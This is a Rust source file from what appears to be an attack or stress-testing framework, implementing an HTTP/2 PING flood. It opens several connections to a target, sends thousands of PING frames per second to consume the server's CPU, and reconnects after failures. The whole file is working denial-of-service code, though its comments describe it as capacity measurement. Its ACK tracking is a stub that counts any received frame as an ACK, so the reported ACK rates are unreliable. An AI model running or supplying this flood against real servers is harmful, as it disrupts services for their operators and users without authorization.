//! HTTP/2 PING Flood Attack
//!
//! This attack floods the target with PING frames, which the server must
//! respond to with PING ACK frames. This consumes server CPU resources
//! for frame processing and can help measure server capacity.
//!
//! The attack works by:
//! 1. Opening an HTTP/2 connection to the target
//! 2. Sending thousands of PING frames in rapid succession
//! 3. Tracking how many PINGs the server can handle per second
//! 4. Measuring response latency

use std::sync::Arc;
use std::time::{Duration, Instant};

use async_trait::async_trait;
use bytes::Bytes;
use phoenix_core::RawH2Connection;
use phoenix_metrics::AttackMetrics;
use tracing::{info, warn, error};
use url::Url;

use crate::{Attack, AttackContext, AttackError, AttackResult, parse_target};

/// HTTP/2 PING Flood Attack implementation
pub struct PingFloodAttack {
    /// Number of PING frames to send per second
    pings_per_second: u32,
    
    /// Number of concurrent connections
    connections: usize,
    
    /// Attack duration
    duration: Duration,
    
    /// Whether to wait for PING ACK responses
    wait_for_ack: bool,
}

impl PingFloodAttack {
    /// Create a new PingFloodAttack with default configuration
    pub fn new() -> Self {
        Self {
            pings_per_second: 5_000,
            connections: 3,
            duration: Duration::from_secs(30),
            wait_for_ack: false,
        }
    }
    
    /// Set the PINGs per second rate
    pub fn with_pings_per_second(mut self, pps: u32) -> Self {
        self.pings_per_second = pps;
        self
    }
    
    /// Set the number of concurrent connections
    pub fn with_connections(mut self, connections: usize) -> Self {
        self.connections = connections;
        self
    }
    
    /// Set the attack duration
    pub fn with_duration(mut self, duration: Duration) -> Self {
        self.duration = duration;
        self
    }
    
    /// Set whether to wait for PING ACK responses
    pub fn with_wait_for_ack(mut self, wait: bool) -> Self {
        self.wait_for_ack = wait;
        self
    }
    
    /// Build a PING frame with unique opaque data
    fn build_ping_frame(&self, ping_id: u64) -> Bytes {
        use bytes::BufMut;
        
        let mut buf = bytes::BytesMut::with_capacity(17);
        
        // Frame length: 8 bytes for opaque data
        buf.put_u32(8);
        
        // Frame type: PING (0x06)
        buf.put_u8(0x06);
        
        // Flags: ACK=0
        buf.put_u8(0x00);
        
        // Stream identifier: 0 for PING
        buf.put_u32(0);
        
        // Opaque data: 8 bytes containing ping ID
        buf.put_u64(ping_id);
        
        buf.freeze()
    }
    
    /// Build a PING ACK frame
    fn build_ping_ack_frame(&self, ping_id: u64) -> Bytes {
        use bytes::BufMut;
        
        let mut buf = bytes::BytesMut::with_capacity(17);
        
        // Frame length: 8 bytes for opaque data
        buf.put_u32(8);
        
        // Frame type: PING (0x06)
        buf.put_u8(0x06);
        
        // Flags: ACK=1
        buf.put_u8(0x01);
        
        // Stream identifier: 0 for PING
        buf.put_u32(0);
        
        // Opaque data: 8 bytes containing ping ID (echo back)
        buf.put_u64(ping_id);
        
        buf.freeze()
    }
}

#[async_trait]
impl Attack for PingFloodAttack {
    fn name(&self) -> &str {
        "http2-ping-flood"
    }
    
    fn description(&self) -> &str {
        "HTTP/2 PING Flood Attack. Sends thousands of PING frames, forcing the server to respond with PING ACK frames. Measures server capacity and response latency for PING processing."
    }
    
    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        info!("Starting HTTP/2 PING Flood Attack against {}", ctx.target);
        
        let (target_host, target_port) = parse_target(&ctx.target)?;
        
        // Use context values if provided, otherwise use struct defaults
        let pings_per_second = ctx.extra.get("pings_per_second")
            .and_then(|s| s.parse().ok())
            .unwrap_or(self.pings_per_second);
        let connections = if ctx.connections > 0 { ctx.connections } else { self.connections };
        let duration = if ctx.duration.as_secs() > 0 { ctx.duration } else { self.duration };
        let wait_for_ack = ctx.extra.get("wait_for_ack")
            .map(|s| s == "true")
            .unwrap_or(self.wait_for_ack);
        
        info!("Configuration: {} connections, {} PPS, wait_for_ack: {}, duration: {:?}", 
              connections, pings_per_second, wait_for_ack, duration);
        
        let metrics = ctx.metrics.clone();
        let start_time = Instant::now();
        
        // Calculate interval between PINGs
        let interval_ns = 1_000_000_000 / pings_per_second as u64;
        let interval = Duration::from_nanos(interval_ns);
        
        // Launch attack tasks
        let mut tasks = Vec::new();
        for conn_idx in 0..connections {
            let target_host = target_host.clone();
            let metrics = metrics.clone();
            let start_time = start_time;
            let duration = duration;
            let interval = interval;
            let wait_for_ack = wait_for_ack;
            
            let task = tokio::spawn(async move {
                let mut total_pings = 0u64;
                let mut errors = 0u64;
                let mut acks_received = 0u64;
                
                // Connect to target - construct URL from host and port
                let url_str = format!("https://{}:{}", target_host, target_port);
                let url = match Url::parse(&url_str) {
                    Ok(url) => url,
                    Err(e) => {
                        error!("Invalid URL for connection {}: {}", conn_idx, e);
                        return (0, 1, 0);
                    }
                };
                
                let mut connection = match RawH2Connection::connect(&url).await {
                    Ok(conn) => conn,
                    Err(e) => {
                        error!("Connection {} failed to connect: {}", conn_idx, e);
                        return (0, 1, 0);
                    }
                };
                
                // Perform handshake
                if let Err(e) = connection.perform_handshake().await {
                    error!("Connection {} handshake failed: {}", conn_idx, e);
                    return (0, 1, 0);
                }
                
                info!("Connection {} ready for PING flood", conn_idx);
                
                let mut ping_id = 0u64;
                let mut next_ping_time = start_time;
                let mut pending_pings = std::collections::HashMap::new();
                
                // Flood loop
                while start_time.elapsed() < duration {
                    let now = Instant::now();
                    
                    // Send PINGs at the target rate
                    if now >= next_ping_time {
                        let attack = PingFloodAttack::new();
                        let ping_frame = attack.build_ping_frame(ping_id);
                        
                        let send_time = Instant::now();
                        
                        match connection.send_frame(ping_frame).await {
                            Ok(_) => {
                                total_pings += 1;
                                metrics.record_request(0, true, 0).await;
                                
                                if wait_for_ack {
                                    pending_pings.insert(ping_id, send_time);
                                }
                                
                                ping_id += 1;
                                
                                // Update next ping time
                                next_ping_time += interval;
                                
                                // If we've fallen behind, catch up gradually
                                if next_ping_time < now {
                                    next_ping_time = now + interval;
                                }
                            }
                            Err(e) => {
                                error!("Connection {} failed to send PING frame: {}", conn_idx, e);
                                errors += 1;
                                
                                // Try to reconnect
                                let url_str = format!("https://{}:{}", target_host, target_port);
                                let url = match Url::parse(&url_str) {
                                    Ok(url) => url,
                                    Err(e) => {
                                        error!("Invalid URL during reconnection: {}", e);
                                        break;
                                    }
                                };
                                
                                match RawH2Connection::connect(&url).await {
                                    Ok(new_conn) => {
                                        connection = new_conn;
                                        if let Err(e) = connection.perform_handshake().await {
                                            error!("Reconnection handshake failed: {}", e);
                                            break;
                                        }
                                        info!("Connection {} reconnected", conn_idx);
                                        pending_pings.clear();
                                    }
                                    Err(e) => {
                                        error!("Reconnection failed: {}", e);
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    
                    // Check for incoming frames (PING ACKs)
                    if wait_for_ack && !pending_pings.is_empty() {
                        match connection.read_frame().await {
                            Ok(frame) => {
                                // Parse frame to check if it's a PING ACK
                                // This is simplified - in reality we'd parse the frame
                                // For now, we'll just count any received frame as progress
                                acks_received += 1;
                                
                                // In a real implementation, we would:
                                // 1. Parse frame header to get type and flags
                                // 2. If type=0x06 and flags=0x01 (PING ACK)
                                // 3. Parse opaque data to get ping_id
                                // 4. Remove from pending_pings and record latency
                            }
                            Err(e) => {
                                error!("Error receiving frame: {}", e);
                                errors += 1;
                            }
                        }
                    }
                    
                    // Small yield to prevent starving the runtime
                    if total_pings % 1000 == 0 {
                        tokio::task::yield_now().await;
                    }
                    
                    // Sleep briefly if we're ahead of schedule
                    if next_ping_time > now {
                        let sleep_duration = next_ping_time.duration_since(now);
                        if sleep_duration > Duration::from_micros(100) {
                            tokio::time::sleep(Duration::from_micros(100)).await;
                        }
                    }
                }
                
                // Clean up pending pings
                if wait_for_ack {
                    let lost_pings = pending_pings.len() as u64;
                    if lost_pings > 0 {
                        warn!("Connection {} lost {} PINGs without ACK", conn_idx, lost_pings);
                        errors += lost_pings;
                    }
                }
                
                info!("Connection {} completed: {} PINGs, {} ACKs, {} errors", 
                      conn_idx, total_pings, acks_received, errors);
                
                (total_pings, errors, acks_received)
            });
            
            tasks.push(task);
        }
        
        // Collect results
        let mut total_pings = 0u64;
        let mut total_errors = 0u64;
        let mut total_acks = 0u64;
        
        for task in tasks {
            match task.await {
                Ok((pings, errors, acks)) => {
                    total_pings += pings;
                    total_errors += errors;
                    total_acks += acks;
                }
                Err(e) => {
                    error!("Task panicked: {}", e);
                    total_errors += 1;
                }
            }
        }
        
        let actual_duration = start_time.elapsed();
        let snapshot = metrics.snapshot().await;
        
        // Calculate actual PPS
        let actual_pps = if actual_duration.as_secs() > 0 {
            total_pings as f64 / actual_duration.as_secs_f64()
        } else {
            0.0
        };
        
        // Calculate ACK rate if waiting for ACKs
        let ack_rate = if wait_for_ack && total_pings > 0 {
            total_acks as f64 / total_pings as f64 * 100.0
        } else {
            0.0
        };
        
        info!("PING flood completed:");
        info!("  Total PINGs sent: {}", total_pings);
        info!("  Total ACKs received: {}", total_acks);
        info!("  Total errors: {}", total_errors);
        info!("  Target PPS: {}", pings_per_second);
        info!("  Actual PPS: {:.1}", actual_pps);
        if wait_for_ack {
            info!("  ACK rate: {:.1}%", ack_rate);
        }
        info!("  Duration: {:?}", actual_duration);
        
        Ok(AttackResult {
            success: true,
            total_requests: total_pings,
            errors: total_errors,
            duration: actual_duration,
            snapshot,
        })
    }
}

impl Default for PingFloodAttack {
    fn default() -> Self {
        Self::new()
    }
}